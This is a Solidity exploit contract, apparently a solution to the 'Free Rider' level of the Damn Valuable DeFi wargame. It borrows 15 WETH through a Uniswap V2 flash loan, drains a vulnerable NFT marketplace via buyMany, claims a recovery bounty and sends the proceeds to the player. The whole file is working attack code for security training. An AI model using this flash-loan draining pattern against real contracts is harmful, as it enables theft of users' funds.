// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0Out, uint amount1Out, bytes calldata data) external;
}

contract Attacker is IUniswapV2Callee, IERC721Receiver, Test {
    address private immutable player; // Address to send any remaining ETH
    WETH private immutable wethContract; // Store WETH contract instance for use in callback
    IUniswapV2Pair private uniswapPairContract;
    DamnValuableToken token;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;
    
    uint256 constant NFT_PRICE = 15 ether;

    error FailedToSendEtherToPlayer();

    constructor(address _player, WETH _weth, IUniswapV2Pair _uniswapPair, DamnValuableToken _token, FreeRiderNFTMarketplace _marketplace, DamnValuableNFT _nft, FreeRiderRecoveryManager _recoveryManager) {
        player = _player;
        wethContract = _weth;
        uniswapPairContract = _uniswapPair;
        token = _token;
        marketplace = _marketplace;
        nft = _nft;
        recoveryManager = _recoveryManager;
    }

    /// @notice Initiates a flash loan from the specified Uniswap pair.
    /// 
    /// @param amountToBorrowWETH The amount of WETH to borrow.
    /// @dev This function is payable to allow the caller (player) to send ETH to cover flash loan fees.
    function performFlashloan(
         IUniswapV2Pair,
        uint256 amountToBorrowWETH
    ) external payable { // Payable to receive ETH from player to cover fees
        // Data passed to uniswapV2Call can be empty if all necessary info (like wethContract) is stored.
        bytes memory data = bytes("0x00"); 

        // Request a flash loan from the Uniswap pair.
        // We are borrowing `amountToBorrowWETH` of token0 (WETH) and 0 of token1.
        // The pair will call `uniswapV2Call` on `address(this)`.
        //emit log_named_decimal_uint("attacker WETH balance", wethContract.balanceOf(address(this)), 18);

        uniswapPairContract.swap(amountToBorrowWETH, 0, address(this), data);
    }

    /// @notice Callback function invoked by the Uniswap V2 pair after dispensing the loan.
    /// @param sender The address of the Uniswap V2 pair.
    /// @param amount0Out The amount of token0 (WETH) received by this contract.
    /// @param amount1Out The amount of token1 (DVT) received (should be 0).
    /// @param _data Arbitrary data passed from the `swap` call (unused in this version).
    function uniswapV2Call(address sender, uint amount0Out, uint amount1Out, bytes calldata _data) external override {
        //require(amount1Out == 0, "Attacker: Expected to borrow WETH (token0), not DVT (token1)");
        
        uint256 borrowedWETHAmount = amount0Out; // This is the WETH this contract received from the loan

        // Calculate the total amount of WETH to repay, including the Uniswap V2 0.3% fee.
        uint256 totalRepaymentWETH = (borrowedWETHAmount * 1000 + 996) / 997; 
        
        // Calculate the fee amount in WETH. This is what needs to be covered by depositing ETH.
        console.log("flashloan successful, 15 WETH received");
        emit log_named_decimal_uint("attacker WETH balancer", wethContract.balanceOf(address(this)), 18);
        console.log();

        // swapped WETH to ETH
        console.log();
        console.log("15 WETH swapped to ETH");
        wethContract.withdraw(15 ether);
        emit log_named_decimal_uint("attacker ETH balancer", (address(this)).balance, 18);

        uint256[] memory nftIds = new uint256[](6);
        
        for (uint256 i = 0; i < nftIds.length; i++) {
            nftIds[i] = i; 
            }

        //nft.setApprovalForAll(address(marketplace), true);
        marketplace.buyMany{value: NFT_PRICE}(nftIds);
        
        
        // Transfer the first 5 NFTs normally
        for (uint256 tokenId = 0; tokenId < 5; tokenId++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), tokenId, "");
        }
        
        // For the last NFT, encode the player address as data
        // This is required by the recovery manager to send the bounty
        bytes memory encodedAddress = abi.encode(player);
        console.logBytes(encodedAddress);
        nft.safeTransferFrom(address(this), address(recoveryManager), 5, encodedAddress);
        
        console.log();
        console.log("6 NFTs bought, 15 ETH spent 90 ETH received due to vulnerability");
        console.log("all NFTs sent to recoveryManager");
        emit log_named_decimal_uint("attacker ETH balancer", (address(this)).balance, 18);
        emit log_named_decimal_uint("attacker WETH balancerr", wethContract.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("initial marketplace eth balance", address(marketplace).balance, 18);
        console.log();

        wethContract.deposit{value: totalRepaymentWETH}();
        console.log("totalRepaymentWETH amount of ETH(appr.15) converted to WETH");
        emit log_named_decimal_uint("attacker WETH balance", wethContract.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("attacker ETH balance", (address(this)).balance, 18);
        console.log();

        wethContract.transfer(address(uniswapPairContract), totalRepaymentWETH);
        console.log("loan(15 WETH) paid back to uniswap");
        emit log_named_decimal_uint("attacker WETH balance", wethContract.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("attacker ETH balance", (address(this)).balance, 18);
        console.log();
        
        // All WETH is converted to ETH
        wethContract.withdraw(wethContract.balanceOf(address(this)));
        (bool success, ) = player.call{value: address(this).balance}("");
        require(success, "Attacker: ETH transfer to player failed");
        console.log("all ETH balance is transferred to player");
        emit log_named_decimal_uint("player ETH balance after hack", player.balance, 18);
    }

    // Fallback function to allow the contract to receive ETH (e.g., from the player for fees).
    receive() external payable {}

    function onERC721Received(address, address, uint256 , bytes memory ) external override pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}